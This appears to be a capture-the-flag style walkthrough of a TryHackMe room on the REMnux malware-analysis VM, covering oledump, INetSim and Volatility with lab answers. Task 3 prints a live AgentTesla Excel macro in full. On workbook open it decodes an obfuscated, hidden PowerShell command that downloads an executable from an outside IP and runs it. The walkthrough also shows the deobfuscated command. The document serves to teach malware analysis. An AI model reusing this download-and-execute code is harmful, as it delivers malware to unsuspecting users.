## Solution

### Task 1 - Introduction

Analysing potentially malicious software can be daunting, especially when this is part of an ongoing security incident. This analysis puts much pressure on the analyst. Most of the time, the results must be as accurate as possible, and analysts use different tools, machines, and environments to achieve this. In this room, we will use the REMnux VM.

The REMnux VM is a specialised Linux distro. It already includes tools like Volatility, YARA, Wireshark, oledump, and INetSim. It also provides a sandbox-like environment for dissecting potentially malicious software without risking your primary system. It's your lab set up and ready to go without the hassle of manual installations.

#### Learning Objectives

- Explore the tools inside the REMnux VM
- Learn how to use tools to analyse potentially malicious documents effectively
- Learn how to simulate a fake network to aid in the analysis
- Be familiar with the tools used to analyse memory images

#### Room Prerequisites

Familiarity with the CyberChef tool is recommended but not mandatory before starting the course. You can check the room associated with it.

- [CyberChef: The Basics](https://tryhackme.com/jr/cyberchefbasics)

### Task 2 - Machine Access

We will use the AttackBox and the attached virtual machine in this room. To start the REMnux virtual machine, click the green **Start Machine** button.

The machine will start in a split-screen view and might take 2-3 minutes to boot up. It is expected to have the an output similar to the image below.

### Task 3 - File Analysis

In this task, we will use `oledump.py` to conduct static analysis on a potentially malicious Excel document.

`Oledump.py` is a Python tool that analyzes **OLE2** files, commonly called Structured Storage or Compound File Binary Format. **OLE** stands for **Object Linking and Embedding**, a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

Let's start!

Using the virtual machine attached to task 2, the REMnux VM, navigate to the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. Our target file is named `agenttesla.xlsm`. Run the command `oledump.py agenttesla.xlsm`. See the terminal below.

```bash
ubuntu@10.10.180.204:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

Based on OleDump's file analysis, a VBA script might be embedded in the document and found inside `xl/vbaProject.bin`. Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index)+Numbers are called **data streams**.

Now, we should be aware of the data stream with the capital letter **M**. This means there is a **Macro**, and you might want to check out this data stream, `'VBA/ThisWorkbook'`.

So, let's check it out! Let's run the command `oledump.py agenttesla.xlsm -s 4`. This command will run the oledump and look into the actual data stream of interest using the parameter `-s 4`, wherein the `-s` parameter is short for `-select` and the number four (4) as the data stream of interest is in the 4th place(`A4: M   688 'VBA/ThisWorkbook'`)

```bash
ubuntu@10.10.180.204:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
```

The results above are in hex dump format. There might be some familiar words from a trained eye. However, this is still challenging for us, don't you think? So, let's make it more readable and easier to understand.

We will run an additional parameter `--vbadecompress` in addition to the previous command. When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format, making it easier to analyze the contents of the macros.

```bash
ubuntu@ip-10-10-180-204:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
End Sububuntu@ip-10-10-180-204:~/Desktop/tasks/agenttesla$ 
```

This is much better, isn't it?

Now, we don't need to be able to read the whole script but rather familiarize ourselves with some characters and commands. Our interest here would be the value of **Sqtnew** because if you check the script, there is a Public IP, a PDF, and a .exe inside. We might want to look into this further.

```text
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
```

We will copy the first value of **Sqtnew** and paste it into **CyberChef**'s input area. You can open a local copy of CyberChef inside the REMnux VM or go to [this link](https://gchq.github.io/CyberChef/) to access the online version. Use whichever works for you. You might want to check our room about CyberChef to get more familiar with the tool.

Next, select the **Find/Replace** operation twice. Looking back at the script, the 2nd and 3rd values of Sqtnew have a command to replace `*` with `""` and `^` with `""`. We would assume that the `""` means there is no value. So, with our first operation selected, we put the value `*` and selected **SIMPLE STRING** as additional parameters. In contrast, we did not put anything on the Replace box or have any value.  The same applies to our second operation: we put the value `^` and selected **SIMPLE STRING**, and the replace box has no value. See the image below.

![Find and Replace in CyberChef](Images/Find_and_Replace_in_CyberChef.png)

Now, this is more readable! However, for our starters, this can be challenging. So, we will tackle the most basic commands here.

```powershell
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

Let's break it down!

- So, in PowerShell, running the `-WindowStyle` parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, `hidden` means that the PowerShell window **won’t be visible to the user**.
- By default, PowerShell restricts script execution for security reasons. The `-executionpolicy` parameter allows you to override this policy. The `bypass` means that the **execution policy is temporarily ignored**, allowing any script to run without restriction.
- The `Invoke-WebRequest` is commonly used for downloading files from the internet.
  - The `-Uri` Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/`.
  - The `-OutFile` specifies the local file where the downloaded content will be saved. In this case, the `Doc-3737122pdf.exe` will be saved to $TempFile.
- The `Start-Process` is used to execute the downloaded file that is stored in `$TempFile` after the web request.

To summarize, when the document `agenttesla.xlsm` is opened, a Macro will run! This Macro contains a VBA script. The script will run and will be running a PowerShell to download a file named `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/`, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (`Doc-3737122pdf.exe`). This is a usual technique used by threat actors to avoid early detection. Pretty nasty, right?!

Kudos to you for figuring it out!

### Task 4 - Fake Network to Aid Analysis

During dynamic analysis, it is essential to observe the behaviour of potentially malicious software—especially its network activities. There are many approaches to this. We can create a whole infrastructure, a virtual environment with different core machines, and more. Alternatively, there is a tool inside our REMnux VM called **INetSim: Internet Services Simulation Suite!**

We will utilize INetSim's features to simulate a real network in this task.

#### Virtual Machines

For this task, we will use two (2) machines. The first is our REMnux machine, which is linked to the Machine Access Task. The second VM is the AttackBox. To start the AttackBox, click the blue **Start AttackBox** button at the top of the page. Do note that you can easily switch between boxes by clicking on them.

#### INetSim

Before we start, we must configure the tool INetSim inside our REMnux VM. Do not worry; this is a simple change of configuration. First, check the IP address assigned to your machine. This can be seen using the command `ifconfig` or simply by checking the IP address after the **ubuntu@** from the terminal. The IP addresses may vary.

```bash
ubuntu@10.10.180.204:~$
```

Here, the machine’s IP is `10.10.180.204`. Take note of this, as we will need it.

Next, we need to change the INetSim configuration by running this command `sudo nano /etc/inetsim/inetsim.conf` and look for the value `#dns_default_ip 0.0.0.0`.

```bash
ubuntu@10.10.180.204:~$ sudo nano /etc/inetsim/inetsim.conf
#########################################
# dns_default_ip
#
# Default IP address to return with DNS replies
#
# Syntax: dns_default_ip 
#
# Default: 127.0.0.1
#
#dns_default_ip  0.0.0.0
```

Remove the comment or **#**, then change the value of dns_default_ip from `0.0.0.0` to the machine’s IP address you have identified earlier. In our case, this is `10.10.180.204`. Save the file using `CRTL + O` command, press `Enter` and exit using `CTRL + X`.

Confirm that the changes have been successful by checking the value of dns_default_ip using this command cat /etc/inetsim/inetsim.conf | grep dns_default_ip. See below.

```bash
ubuntu@10.10.180.204:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip
# dns_default_ip
# Syntax: dns_default_ip 
dns_default_ip    10.10.180.204
```

Finally, run the command `sudo inetsim` to start the tool.

```bash
ubuntu@ip-10-10-180-204:~$ sudo inetsim

 done.
Simulation running.

```

After running the command, ensure you see the sentence "**Simulation running**" at the bottom of the result and ignore the **http_80_tcp—failed!** Our fake network is now running!

Let's move on to our AttackBox!

#### AttackBox

From this VM, open a browser and go to our REMnux's IP address using the command `https://10.10.180.204`. This will prompt a Security Risk; ignore it, click **Advanced...**, then **Accept the Risk and Continue**.

Once done, you should be redirected to the INetSim's homepage!

```text
This is the default HTML page for INetSim HTTP server fake mode.

This file is an HTML document.
```

One usual malware behaviour is downloading another binary or script. We will try to mimic this behaviour by getting another file from INetsim. We can do this via the CLI or browser, but let's use the CLI to make it more realistic. Use this command: `sudo wget https://10.10.180.204/second_payload.zip --no-check-certificate`.

```bash
root@10.10.180.204:~# sudo wget https://10.10.180.204/second_payload.zip --no-check-certificate
--2024-09-22 22:18:49--  https://10.10.180.204/second_payload.zip

2024-09-22 22:18:49 (14.5 MB/s) - \u2018second_payload.zip\u2019 saved [258/258]
```

You can try downloading another file as well. For example, try downloading `second_payload.ps1` by using the command: `sudo wget https://10.10.180.204/second_payload.ps1 --no-check-certificate`.

To verify that the files were downloaded, check your root folder.

All of these are fake files! Try to open the `second_payload.ps1`. When executed, this will direct you to INetSim's homepage.

```bash
root@ip-10-10-176-182:~# cat second_payload.ps1 
<html>
  <head>
    <title>INetSim default HTML page</title>
  </head>
  <body>
    <p></p>
    <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
    <p align="center">This file is an HTML document.</p>
  </body>
</html>
root@ip-10-10-176-182:~# 
```

What we did here is **mimic a malware's behaviour**, wherein it will try to reach out to a server or URL and then **download a secondary file that may contain another malware**.

#### Connection Report

Lastly, go back to your REMnux VM and stop INetSim. By default, it will create a report on its captured connections. This is usually saved in `/var/log/inetsim/report/` directory. You should be able to see something like this.

```bash
<---snip--->
  * smtp_25_tcp - stopped (PID 2344)
  * https_443_tcp - stopped (PID 2343)
  * https_443_tcp - stopped (PID 2343)
Simulation stopped.
Report written to '/var/log/inetsim/report/report.2594.txt' (14 lines)
=== INetSim main process stopped (PID 2594) ===
```

Read the file using this command `sudo cat /var/log/inetsim/report/report.2594.txt`. This may differ from your machine.

```bash

```

These are the logs when the tool was running. We can see the connections made to the URL, the protocol, and the method it's using. We can also see the fake file that was downloaded.

---------------------------------------------------------------------------------------

Download and scan the file named flag.txt from the terminal using the command `sudo wget https://10.10.180.204/flag.txt --no-check-certificate`

#### What is the flag?

Make sure INetSim is running and download with curl

```bash
root@ip-10-10-176-182:~# curl -k https://10.10.180.204/flag.txt

This is the default text document for INetSim HTTP server fake mode.

This file is plain text.

You found it! The flag is = Tryhackme{<REDACTED>}

Answer: `GET`

### Task 5 - Memory Investigation: Evidence Preprocessing

One of the most common investigative practices in Digital Forensics is the preprocessing of evidence. This involves running tools and saving the results in text or JSON format. The analyst often relies on tools such as Volatility when dealing with memory images as evidence. This tool is already included in the REMnux VM. Volatility commands are executed to identify and extract specific artefacts from memory images, and the resulting output can be saved to text files for further examination. Similarly, we can run a script involving the tool's different parameters to preprocess the acquired evidence faster.

#### Preprocessing With Volatility

In this task, we will use the Volatility 3 tool version. However, we won’t go deep into the investigation and analysis part of the result—we could write a whole book about it! Instead, we want you to be familiar with and get a feel for how the tool works. Run the command as instructed and wait for the result to show. Each plugin takes 2-3 minutes to show the output.

Here are some of the parameters or plugins we will use. We will focus on Windows plugins.

- windows.pstree.PsTree
- windows.pslist.PsList
- windows.cmdline.CmdLine
- windows.filescan.FileScan
- windows.dlllist.DllList
- windows.malfind.Malfind
- windows.psscan.PsScan

Let’s get started then!

In your RemnuxVM, run `sudo su`, then navigate to `/home/ubuntu/Desktop/tasks/Wcry_memory_image/` directory, and our file would be wcry.mem. We will run each plugin after the command `vol3 -f wcry.mem`.

#### PsTree

This plugin lists processes in a tree based on their parent process ID.

For more information regarding other plugins, you may check [this link](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html).

Now, you have the plugins running individually and seeing the result. What you will do now is process this in bulk. Remember, one of the investigative practices involves preprocessing evidence and saving the results to text files, right? The question is how?

The answer? Do a loop statement! See the command below.

```bash
root@10.10.180.204:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

Let’s break this command down, shall we?

- We created a variable named `$plugin` with values of each volatility plugin
- Then ran vol3 parameters `-q`, which means quiet mode or does not show the progress in the terminal
- And `-f`, which means read from the memory capture.
- The `$plugin > wcry.$plugin.txt; done` means run volatility with the plugins and output it to a file with wcry at the beginning of the text, followed by the name of the plugins and with an extension of `.txt`. Repeat until the value of variable $plugin is used.

After running the command, you won't see any output from the terminal; you'll see files within the same directory where you ran the command.

#### Preprocessing With Strings

Next, we will preprocess the memory image with the Linux strings utility. We will extract the **ASCII**, 16-bit **little-endian**, and 16-bit **big-endian** strings. See the command below.

```bash
root@10.10.180.204:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings wcry.mem > wcry.strings.ascii.txt
root@10.10.180.204:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt
root@10.10.180.204:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt
```

The strings command extracts printable ASCII text. The `-e l` option tells strings to extract 16-bit little endian strings. The `-e b` option tells strings to extract 16-bit big endian strings. All three string formats can provide useful information about the system under investigation.

Now, this is ready for analysis, but remember, our goal here in this task is to preprocess the evidence so that any analyst who will investigate this can expedite searches and analysis.

```

Answer: `csrss.exe`

#### Continuing from the previous question (Question 6), what is the second (2nd) process identified suspected of having an injected code?

Answer: `winlogon.exe`

#### By running vol3 with the DllList parameter, what is the file path or directory of the binary `@WanaDecryptor@.exe`?

Hint: run vol3 with dlllist parameter then grep for `@WanaDecryptor@.exe`

```bash
root@ip-10-10-180-204:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.dlllist.DllList | grep '@WanaDecryptor@.exe'
740gress@WanaDecryptor@    0x400000PDB scan0x3d000n@WanaDecryptor@.exe    C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe    N/A    Disabled
```

Answer: `C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe`

### Task 6 -  Conclusion

In this room, we had a hands-on introduction to the REMnux VM, where we could use tools like **oledump.py** for file analysis. We also created a fake network using **INetSim** and preprocessed a memory capture using **volatility** and **strings**. All of these tools are included just inside the REMNux VM! Still, we haven't used many of its tools yet, as we could create different rooms for each to learn and become familiar with it.

On a side note, REMnux Distro mainly focuses on analyses of potentially malicious programs, documents or files, memory, and similar objects.
